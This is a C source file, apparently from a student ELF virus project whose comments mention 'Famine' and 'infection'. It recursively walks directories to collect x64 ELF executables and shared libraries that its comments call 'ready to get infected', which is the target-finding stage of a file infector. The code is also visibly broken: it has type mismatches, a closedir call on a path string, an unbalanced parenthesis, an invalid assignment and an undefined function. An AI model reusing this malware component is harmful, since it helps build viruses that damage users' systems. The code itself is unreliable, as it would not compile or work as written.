#include "infection.h"

/*
** takes a path and return success if is a dirretory
*/
char                is_directory(const char *filename)
{
    struct stat     buff;
    DIR*            dir;

    if (syscall(SYS_STAT,filename, &buff) == FAILURE)
        return (FAILURE);
    if (!(dir = opendir(filename))) //check if is a syscall
        return (FAILURE);
    if (closedir(filename) == FAILURE)
        return (FAILURE);
    return (SUCCESS);
}

/*
** takes a path and return success if is a file
*/
char                is_file(const char *filename)
{
    struct stat     buff;

    if (syscall(SYS_STAT, filename, &buff) == FAILURE)
        return (FAILURE);
    return (SUCCESS);
}

/*
** return the 2d len of a given matrix
*/
unsigned long       mtrx2d_len(char **str)
{
    char            **increment;

    increment = str;
    while (increment && *increment++)
        ;
    return (*increment - *str);
}

/*
** takes a matrix and a elem, will copy dinamically the matrix and add space for the elem
** returns the copy and free the original
*/
char                mtrx2d_add_elem(char **mtrx, char *elem)
{
    char            **cpy;
    int             index;

    if (!(cpy = malloc(sizeof(char *) * (mtrx2d_len(mtrx) * 2)))) // + 2 -> new elem + '\0'
        return (FAILURE);
    index = -1;
    while (mtrx && mtrx[++index])
        cpy[index] = mtrx[index];
    cpy[index] = elem;
    cpy[index + 1] = '\0';
    if (mtrx)
        (void)free(mtrx);
    return (SUCCESS);
}

/*
** check if a file following the given path is a elf x64 file
*/
char                valid_elf_file(const char *path, int type)
{
    t_elf           elf;

    if (read_elf(&elf, path) == FAILURE)
        return (FAILURE);
    if (elf.hdr->e_type != ELF_EXC_TYPE && elf.hdr->e_type != ELF_SHARED_TYPE
            && !(elf.arch_x64 && type == ELF_x64))
    {
        (void)free_elf(&elf);
        return (FAILURE);
    }
    (void)free_elf(&elf);
    return (SUCCESS);
}

/*
** takes the dir path and the file path concats an dcopy i to dest param
*/
void                 get_path(char *dir_name, char *file_name, char *dest[])
{
    int                     i;
    int                     j;

    i = -1;
    while (dir_name[++i])
        *dest[i] = dir_name[i];
    j = -1;
    while (file_name[++j])
        *dest[i + j] = file_name[j];
    *dest[i + j] = '\0';
} // need cat a '/' or is in the filename or dirname ?


/*
** take matrix of files and the dir path, will check if the content into the dir are files
** if files are founded if will copy and add to files param, if the content is a dir
** it will call itself recursivelly ultil there are only files in the dir (copping the files into files param)
** return matrix of valid elf x64 files readdy to get infected
*/
char                **get_elf_files(char **files, char *dir_path, int type)
{
    struct linux_dirent_x64 *dirent;
    char            *absolute_path;
    char            *file_path;
    char            **folders;
    DIR*            dir;
    int             index;

    if (!dir_path || !(dir = opendir(dir_path)|| !files)
        return (NULL);
    while(dirent = readdir(dir)) // or getdents64 need doc
    {
        if (dirent->d_name[0] == '.' || (dirent->d_name[0] == '.' && dirent->d_name[1] == '.'))
            continue ;
        &file_path = get_path(dir_path, dirent->d_name); // if that doesn t woks see how i did it in Famine
        if (is_file(file_path) == FAILURE)
            continue ;
        if (is_directory(file_path) == SUCCESS)
        {
            folders = mtrx2d_add_elem(folders, file_path);
            continue ;
        }
        if (is_elf_file(file_path, type) == SUCCESS)
            files = mtrx2d_add_elem(files, file_path);
    }
    index = -1;
    while (++index < mtrx2d_len(folders))
    {
        if (!(files = get_elf_files(files, folders[index], type)))
            return (NULL);
        (void)free(folders[index]);
    }
    if (folders)
        (void)free(folders);
    if (closedir(dir) == FAILURE)
        return (NULL);
    return (files);
}